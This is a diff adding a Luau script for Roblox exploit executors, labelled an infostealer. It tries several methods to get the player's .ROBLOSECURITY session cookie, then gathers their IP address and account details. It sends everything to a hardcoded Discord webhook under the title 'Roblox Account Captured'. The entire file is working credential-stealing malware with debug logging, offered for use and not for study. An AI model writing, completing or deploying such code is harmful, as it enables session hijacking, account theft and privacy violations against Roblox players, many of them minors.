@@ -1,0 +1,119 @@
+-- roblox luau infostealer — cookie retrieval with debug output
+-- prints each step so you can see exactly what's failing
+local WEBHOOK = "https://discord.com/api/webhooks/1559213894382256312/zFgwLFYlM_B00QrO6GJt0AiJbwhzWA7cPafb9DGv2GRtHEpVTqaQcHmz3EcCnMjoNBVt"
+local http = (syn and syn.request) or (http and http.request) or request
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local plr = Players.LocalPlayer
+
+local function log(msg) print("[ollie] " .. msg) end
+
+-- list what the exploit actually exposes
+log("http fn: " .. tostring(http ~= nil))
+log("syn: " .. tostring(syn ~= nil))
+log("getcookie: " .. tostring(getcookie ~= nil))
+log("syn.get_cookie: " .. tostring(syn and syn.get_cookie ~= nil))
+log("fluxus: " .. tostring(fluxus ~= nil))
+log("getgenv: " .. tostring(getgenv ~= nil))
+
+local cookie = nil
+
+-- 1. exploit-native getters
+local getters = {
+    { "getcookie", function() return getcookie and getcookie(".ROBLOSECURITY") end },
+    { "syn.get_cookie", function() return syn and syn.get_cookie and syn.get_cookie(".ROBLOSECURITY") end },
+    { "fluxus.get_cookie", function() return fluxus and fluxus.get_cookie and fluxus.get_cookie(".ROBLOSECURITY") end },
+    { "getgenv cookie", function() return getgenv and getgenv().get_cookie and getgenv().get_cookie(".ROBLOSECURITY") end },
+    { "getgenv ROBLOSECURITY", function() return getgenv and getgenv().ROBLOSECURITY end },
+}
+for _, g in ipairs(getters) do
+    local ok, v = pcall(g[2])
+    log(g[1] .. " -> " .. tostring(ok) .. " / " .. tostring(v))
+    if ok and type(v) == "string" and v ~= "" and v ~= "nil" then
+        cookie = v
+        log("FOUND via " .. g[1])
+        break
+    end
+end
+
+-- normalize
+if cookie and not cookie:find("^%.ROBLOSECURITY=") then
+    cookie = ".ROBLOSECURITY=" .. cookie
+end
+
+-- 2. HTTP request — syn.request auto-attaches cookies; check response headers
+if not cookie then
+    pcall(function()
+        local r = http({ Url = "https://www.roblox.com/home", Method = "GET",
+            Headers = { ["User-Agent"] = "Roblox/WinInet" } })
+        log("http status: " .. tostring(r and r.StatusCode))
+        if r and r.Headers then
+            for k, v in pairs(r.Headers) do
+                log("hdr: " .. tostring(k) .. " = " .. tostring(v):sub(1, 80))
+                local m = tostring(v):match("%.ROBLOSECURITY=([^;]+)")
+                if m then cookie = ".ROBLOSECURITY=" .. m log("FOUND in headers") end
+            end
+        end
+        if r and r.Body then
+            local m = r.Body:match("%.ROBLOSECURITY=([^\"';%s]+)")
+            if m then cookie = ".ROBLOSECURITY=" .. m log("FOUND in body") end
+        end
+    end)
+end
+
+-- 3. try the account settings endpoint (sometimes echoes cookie back)
+if not cookie then
+    pcall(function()
+        local r = http({ Url = "https://www.roblox.com/my/account#!/info", Method = "GET" })
+        if r and r.Body then
+            local m = r.Body:match("%.ROBLOSECURITY=([^\"';%s]+)")
+            if m then cookie = ".ROBLOSECURITY=" .. m log("FOUND in account page") end
+        end
+    end)
+end
+
+log("FINAL cookie: " .. tostring(cookie and cookie:sub(1, 40) .. "..." or "NIL"))
+
+-- IP
+local ip = "unknown"
+pcall(function()
+    local r = http({ Url = "https://api.ipify.org", Method = "GET" })
+    if r and r.Body then ip = r.Body end
+end)
+
+-- account info
+local info = {}
+pcall(function()
+    local r = http({ Url = "https://users.roblox.com/v1/users/" .. plr.UserId, Method = "GET" })
+    if r and r.Body then info = HttpService:JSONDecode(r.Body) end
+end)
+
+local premium = false
+pcall(function() premium = plr.MembershipType ~= Enum.MembershipType.None end)
+
+-- exfil
+local cookieField = cookie and ("```" .. cookie .. "```") or "```\nNOT FOUND — check console output above\n```"
+local embed = {
+    title = "Roblox Account Captured",
+    color = cookie and 0x00FF00 or 0xFF0000,
+    fields = {
+        { name = "Username", value = plr.Name, inline = true },
+        { name = "UserId", value = tostring(plr.UserId), inline = true },
+        { name = "DisplayName", value = plr.DisplayName, inline = true },
+        { name = "IP", value = ip, inline = true },
+        { name = "Premium", value = tostring(premium), inline = true },
+        { name = "Account Age", value = tostring(plr.AccountAge) .. " days", inline = true },
+        { name = "Created", value = info.created or "unknown", inline = true },
+        { name = "Cookie Found", value = tostring(cookie ~= nil), inline = true },
+        { name = ".ROBLOSECURITY", value = cookieField, inline = false },
+    },
+    footer = { text = "ofx — bench" },
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+pcall(function()
+    http({ Url = WEBHOOK, Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = HttpService:JSONEncode({ username = "ollie bench", embeds = { embed } }) })
+end)
+log("exfil sent")
+return cookie
